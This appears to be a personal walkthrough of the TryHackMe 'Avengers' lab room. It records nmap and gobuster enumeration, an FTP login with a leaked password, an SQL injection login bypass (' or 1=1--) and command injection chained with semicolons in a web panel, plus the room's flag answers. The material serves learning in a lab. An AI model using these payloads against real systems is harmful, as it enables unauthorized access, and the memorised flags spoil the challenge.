#SQL #RCE #Web 

- https://tryhackme.com/room/avengers

```
nano /etc/hosts
10.10.62.46 avengers.thm

# nmap 

21/ftp open
22/ssh
80/http

# gobuster

```

`10.10.251.99:80`
## Cookies

HTTP Cookies is a small piece of data sent from a website and stored on the user's computer by the user's web browser while the user is browsing.
- login info
- items in shopping cart 
- language preferences 
- advertisers track you via cookies from websites you visit
- right click > inspect > Storage > Cookies

On the deployed Avengers machine you recently deployed, get the flag1 cookie value.
- `flag1 : cookie_secrets`

## HTTP Headers

HTTP Headers let a client and server pass information with an HTTP request or response. Header names and values are separated by a single colon and, are an integral part of the HTTP protocol.
- POST requests
- GET requests
- inspect > Network > refresh page > clicl in `/` > Headers > Response Headers 
  
Look at the HTTP response headers and obtain flag 2.
- `flag 2 : headers_are_important`

## Enumeration & FTP

scan the machine with nmap (a network scanner) and access the FTP service using reusable credentials.

`nmap 10.10.251.99`
- 21 ftp
- 22 ssh
- 80 http

source code `/rocket.jpg` Groot asks if someone can reset his password is `iamgroot` 

We've accessed the web server, let's now access the FTP service. If you read the Avengers web page, you will see that Rocket made a post asking for Groot's password to be reset, the post included his old password too!

- `ftp 10.10.251.99`
- `groot : iamgroot`
- passive > ls > cd files
- `get flag3.txt` > exit
- cat flag3.txt
- ` 8fc651a739befc58d450dc48e1f1fd2e `

## GoBuster 

GoBuster is a tool used to brute-force URIs (directories and files), DNS subdomains and virtual host names. For this machine, we will focus on using it to brute-force directories

Lets run GoBuster with a wordlist (on Kali they're located under `/usr/share/wordlists`):
- `gobuster dir -u http://10.10.251.99 -w /usr/share/wordlists/dirb/common.txt`
- `/usr/share/wordlists/dirbuster/directory-lists-2.3-small.txt`
- `/portal` = login

## SQL Injection

SQL Injection is a code injection technique that manipulates an SQL query. You can execute your own SQL that could destroy the database, reveal all database data (such as usernames and passwords) or trick the web server in authenticating you.

`SELECT * FROM Users WHERE username = {User Input} AND password = {User Input 2}`

` ' or 1=1-- `  for username and password

```
SELECT * FROM Users WHERE username = `admin` AND password = `' 1=1`
```

signed with simple SQLi
- page source = 223

## Remote Code Execution

You should be logged into the Jarvis access panel! Here we can execute commands on the machine

- ls
- `cd ../; ls` = flag5.txt
- `cd ../; ls; cat flag5.txt` no cat allowed
- `cd ../; ls; less flag5.txt`
- ` d335e2d13f36558ba1e67969a1718af7 `